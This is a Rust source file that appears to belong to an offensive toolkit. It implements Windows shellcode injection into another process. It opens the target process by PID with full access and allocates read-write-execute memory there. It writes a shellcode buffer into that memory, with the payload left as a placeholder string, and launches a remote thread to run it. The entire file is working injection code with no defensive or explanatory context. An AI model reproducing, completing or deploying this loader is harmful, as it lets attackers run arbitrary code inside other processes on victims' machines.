use std::ffi::c_void;
use std::ffi::CString;

use eyre::Result;
use lib::memory::create_remote_thread;
use lib::memory::transmute_value;
use lib::memory::virtual_alloc_ex;
use lib::memory::write_process_memory;
use lib::process::close_handle;
use lib::process::get_process_handle;
use lib::process::get_process_name;
use windows::Win32::Foundation::HANDLE;
use windows::Win32::Security::SECURITY_ATTRIBUTES;
use windows::Win32::System::Memory::MEM_COMMIT;
use windows::Win32::System::Memory::MEM_RESERVE;
use windows::Win32::System::Memory::PAGE_EXECUTE_READWRITE;
use windows::Win32::System::Threading::LPPROC_THREAD_ATTRIBUTE_LIST;
use windows::Win32::System::Threading::PROCESS_ALL_ACCESS;

use crate::util::info;

const SHELL_CODE: &str = "Shellcode here";

pub fn inject(pid: u32) -> Result<()> {
    let b_inherint_handle = false;
    let dw_desired_access = PROCESS_ALL_ACCESS;

    let handle_process = get_process_handle(pid, b_inherint_handle, dw_desired_access)?;

    let c_str = CString::new(SHELL_CODE)?;

    let base_address = virtual_alloc(&handle_process);

    match base_address {
        Ok(base_address) => {
            let c_str_buffer = c_str.as_ptr() as *const c_void;

            let mem_written = write_process_memory(
                &handle_process,
                base_address,
                c_str_buffer,
                SHELL_CODE.len(),
                None,
            );

            match mem_written {
                Ok(_) => {
                    let handle_thread = create_rem_thread(handle_process, base_address, pid);
                    let process_name = get_process_name(pid, b_inherint_handle, dw_desired_access)?;

                    match handle_thread {
                        Ok(_) => {
                            info(process_name, base_address);

                            let closed_process = close_handle(handle_process);

                            match closed_process {
                                Ok(_) => (),
                                Err(e) => panic!("Cannot close process handle: {}", e),
                            }
                        }

                        Err(e) => panic!("Cannot get thread handle: {}", e),
                    }
                }

                Err(e) => panic!("Cannot write process memory: {}", e),
            }
        }
        Err(e) => panic!("Cannot alloc virtual ex: {}", e),
    }

    Ok(())
}

fn virtual_alloc(handle: &HANDLE) -> Result<*mut c_void> {
    let lp_address: Option<*const c_void> = None;
    let dw_size = SHELL_CODE.len();
    let fl_allocation_type = MEM_COMMIT | MEM_RESERVE;
    let fl_protect = PAGE_EXECUTE_READWRITE;

    virtual_alloc_ex(handle, lp_address, dw_size, fl_allocation_type, fl_protect)
}

fn create_rem_thread(handle: HANDLE, mem_address: *mut c_void, pid: u32) -> Result<HANDLE> {
    let lp_start_address = transmute_value(mem_address);

    let lp_thread_attributes: Option<*const SECURITY_ATTRIBUTES> = None;
    let lp_thread_parameter: Option<*const c_void> = None;

    let dw_stack_size = 0;
    let dw_creation_flags = 0;

    create_remote_thread(
        handle,
        lp_thread_attributes,
        dw_stack_size,
        lp_start_address,
        lp_thread_parameter,
        dw_creation_flags,
        LPPROC_THREAD_ATTRIBUTE_LIST::default(),
        pid,
    )
}
